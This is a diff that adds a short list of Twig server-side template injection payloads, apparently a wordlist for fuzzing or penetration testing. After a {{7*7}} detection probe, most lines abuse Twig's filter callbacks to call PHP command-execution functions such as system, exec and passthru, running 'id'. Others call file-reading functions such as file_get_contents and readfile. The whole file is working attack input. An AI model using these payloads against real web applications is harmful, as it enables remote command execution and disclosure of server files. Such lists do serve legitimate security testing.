@@ -1,0 +1,16 @@
+{{7*7}}
+{{['id']|filter('system')}}
+{{['id']|filter('exec')}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}
+{{_self.env.getFilter('id')}}
+{{_self.env.getFilter('system')}}
+{{_self.env.getFilter('passthru')}}
+{{_self.env.getFilter('shell_exec')}}
+{{_self.env.getFilter('proc_open')}}
+{{_self.env.getFilter('popen')}}
+{{_self.env.getFilter('readfile')}}
+{{_self.env.getFilter('file_get_contents')}}
+{{_self.env.getFilter('fopen')}}
+{{_self.env.getFilter('fread')}}
+{{_self.env.getFilter('fpassthru')}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
